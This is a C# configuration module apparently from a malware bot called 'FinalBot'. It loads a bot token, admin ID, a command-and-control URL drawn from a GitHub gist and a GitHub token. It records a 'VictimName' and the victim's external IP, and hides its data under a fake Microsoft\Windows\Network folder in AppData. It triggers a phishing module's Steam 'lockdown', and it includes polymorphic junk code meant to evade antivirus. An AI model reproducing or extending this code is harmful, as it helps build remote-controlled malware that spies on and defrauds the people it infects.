using System;
using System.Collections.Generic;
using System.IO;
using VanguardCore;

namespace FinalBot
{
    public static class ConfigManager
    {
        // [POLY_JUNK]
        private static void _vanguard_35a9c4e5() {
            int val = 88357;
            if (val > 50000) Console.WriteLine("Hash:" + 88357);
        }

        private static Dictionary<string, string> _config = new Dictionary<string, string>();

        private static string GetConfigPath()
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string folder = Path.Combine(appData, "Microsoft", "Windows", "Network");
            if (!Directory.Exists(folder)) try { Directory.CreateDirectory(folder); } catch { }
            return Path.Combine(folder, "session.dat");
        }

        public static void Load()
        {
            // Load base secrets from SafetyManager
            _config["BOT_TOKEN"] = SafetyManager.GetSecret("BOT_TOKEN");
            _config["ADMIN_ID"] = SafetyManager.GetSecret("ADMIN_ID");
            _config["C2_URL"] = SafetyManager.GetSecret("GIST_URL");
            _config["GIST_GITHUB_TOKEN"] = SafetyManager.GetSecret("GIST_GITHUB_TOKEN");
            
            _config["VictimName"] = "Unknown";
            try
            {
                string path = GetConfigPath();
                if (System.IO.File.Exists(path))
                {
                    _config["VictimName"] = System.IO.File.ReadAllText(path).Trim();
                }
                
                string blockPath = Path.Combine(Path.GetDirectoryName(path) ?? "", "block.dat");
                if (System.IO.File.Exists(blockPath))
                {
                    string content = File.ReadAllText(blockPath).Trim();
                    FinalBot.Modules.PhishManager.GlobalBlockSteam = content == "1";
                    if (FinalBot.Modules.PhishManager.GlobalBlockSteam) 
                        FinalBot.Modules.PhishManager.StartLockdown();
                }
            }
            catch { }
            
            Logger.Info($"[CONFIG] Configuration loaded. Victim: {VictimName}");
        }

        public static void Save()
        {
            try
            {
                string path = GetConfigPath();
                System.IO.File.WriteAllText(path, VictimName);
                
                string blockPath = Path.Combine(Path.GetDirectoryName(path) ?? "", "block.dat");
                System.IO.File.WriteAllText(blockPath, FinalBot.Modules.PhishManager.GlobalBlockSteam ? "1" : "0");
            }
            catch { }
        }

        public static string VictimName 
        { 
            get => Get("VictimName", "Unknown"); 
            set 
            {
                Set("VictimName", value);
                Save();
            }
        }

        private static string _cachedIp = null;
        public static string LastKnownIp => _cachedIp ??= FinalBot.Modules.SystemInfoModule.GetExternalIP();


        public static string Get(string key, string defaultValue = "")
        {
            if (_config.TryGetValue(key, out string? value))
                return value ?? defaultValue;
            return defaultValue;
        }

        public static void Set(string key, string value)
        {
            _config[key] = value;
        }

        public static long GetLong(string key, long defaultValue = 0)
        {
            if (_config.TryGetValue(key, out string? value) && long.TryParse(value, out long result))
                return result;
            return defaultValue;
        }
    }
}
